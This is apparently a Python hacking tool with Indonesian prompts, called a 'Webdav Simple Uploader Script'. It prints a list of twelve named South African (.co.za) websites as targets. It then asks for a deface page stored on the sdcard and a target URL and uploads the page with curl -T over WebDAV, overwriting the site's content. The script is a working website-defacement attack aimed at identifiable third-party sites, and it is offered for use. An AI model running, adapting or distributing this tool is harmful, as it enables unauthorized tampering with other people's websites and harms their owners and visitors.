import os, time

re = '\033[0m'
bg = '\033[1;97;45m'
putih = '\033[1;97m'
ungu = '\033[1;95m'
kuning = '\033[1;93m'
merah = '\033[1;91m'
hijau = '\033[1;92m'
cyan ='\033[1;36m'
coba = '\033[1;36;45m'

os.system ("clear")
print (f"{hijau}██╗    ██╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗\n██║    ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║\n██║ █╗ ██║█████╗  ██████╔╝██║  ██║███████║██║   ██║\n██║███╗██║██╔══╝  ██╔══██╗██║  ██║██╔══██║╚██╗ ██╔╝\n╚███╔███╔╝███████╗██████╔╝██████╔╝██║  ██║ ╚████╔╝ \n ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝                                            ")
print (f"{ungu} [{cyan}>{ungu}] {re} {kuning} List Web Target :")
print (f"{cyan} [{ungu}+{cyan}] {putih} bitsandpieces.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} windmillsandporcupines.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://scnc.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://contsol.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://colourfactory.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://ayk.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://foodconsult.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://itsengineering.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://holotropicbreathwork.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://lpenterprises.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://lwrm.co.za")
print (f"{cyan} [{ungu}+{cyan}] {putih} http://kwalitycommodities.co.za")
print (f"{ungu} [{cyan}<{ungu}] {re} {kuning} Copy Link Di Atas")
input (f"\n{putih} [{merah}x{putih}] {merah}Tekan Enter Untuk NEXT")
os.system ("clear")
print (f"\n\n\n\n {bg} [Webdav Simple Uploader Script] {re}")
print (f"{cyan} [{ungu}+{cyan}] {re}Masukan nama file script deface")
print (f"{cyan} [{ungu}+{cyan}] {re}Script deface harus ada di sdcard")
print (f"{cyan} [{ungu}+{cyan}] {re}Contoh:index.html")
sc = input(f"{cyan} [{ungu}+{cyan}] {putih}Script: {re}/sdcard/")
tg = input(f"{cyan} [{ungu}+{cyan}] {putih}Target: {re}")
os.system ("curl -T /sdcard/%s %s" % (sc, tg))
os.system ("clear")
print (f"\n\n\n\n {bg} [Webdav Simple Uploader Script] {re}")
print (f"{cyan} [{ungu}+{cyan}] {re}Silahkan cek websitenya")
print (f"{cyan} [{ungu}+{cyan}] {re}%s/%s" % (tg, sc))
print (f"        {re}{hijau}╔╦╗╦ ╦╔═╗╔╗╔╦╔═╔═╗\n        {re}{hijau} ║ ╠═╣╠═╣║║║╠╩╗╚═╗\n        {re}{hijau} ╩ ╩ ╩╩ ╩╝╚╝╩ ╩╚═╝")
input (f"\n{putih} [{merah}x{putih}] {merah}Tekan Enter Untuk Keluar")